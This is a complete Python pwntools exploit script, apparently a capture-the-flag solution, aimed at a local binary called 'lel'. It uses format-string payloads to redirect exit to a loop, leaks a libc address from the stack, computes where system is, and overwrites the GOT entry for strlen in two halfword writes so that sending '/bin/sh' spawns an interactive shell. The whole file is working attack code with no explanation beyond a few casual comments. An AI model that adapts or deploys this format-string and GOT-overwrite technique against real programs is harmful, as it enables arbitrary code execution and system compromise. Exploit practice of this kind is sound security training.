from pwn import *

def pwn():
    r = process(['./lel', 'lol.log'])
    exit       =  0x601258
    loop       =  0x4009bd
    strlen_off =  0x09dc70
    strlen     =  0x601210

    r.recvuntil('Config action:')
    payload =  ''
    payload += 'e  '.ljust(8) 
    payload += ("%{}x %15$hn".format(loop-7))
    payload += p64(exit)
    r.sendline(payload)
    raw_input('debug time again skido')
    r.recvuntil('Config action:')
    r.sendline('e '+'%p '*50)
    leak = r.recvuntil('Config action:')
    i = 48
    leaked = leak[i-14:i]
    libc = int(leaked, 16)-4118720
    system = libc + 0x04f440
    strlenlibc = libc + strlen_off
    log.success('Leaked libc\'s address.....')
    def banner():
        print '================================'
        print '     ~FOR DEBUGGING~'
        log.success('Libc base :  '+ hex(libc))
        log.success('System    :  '+ hex(system))
        log.success('Strlen    :  '+ hex(strlenlibc))
        print '================================'
        print '\n'
        print log.info('Last stage started...')  # Trying to overwrite GOT address of strlen that is used by prompt option and pass shell as an argument :P

    r.recvuntil('Config action:')
    r.sendline('p test')
    sys1 = system & 0x0000ffff
    sys2 = system & 0xffff0000
    sys2 = hex(sys2)
    sys2 = sys2[0:6]
    sys2 = int(sys2, 16)
    banner()
    log.success('sys1 and sys2 set successfully!')
    r.recvuntil('Config action:')
    payload =  ''
    payload += 'e'.ljust(8)
    payload += ("%{}x %17$hn".format(sys1-7)).ljust(16)
    payload += p64(strlen)
    r.sendline(payload)
    r.recvuntil('Config action:')
    payload = ''
    payload += 'e'.ljust(8)
    payload += ("%{}x %17$hn".format(sys2-7)).ljust(16)
    payload += p64(strlen+2)
    r.sendline(payload)

    r.recvuntil('Config action:')
    r.sendline('p /bin/sh')

    log.success('OK payloads finished! Cross your fingers that this shit worked :)')

    banner()
    r.interactive()

pwn()
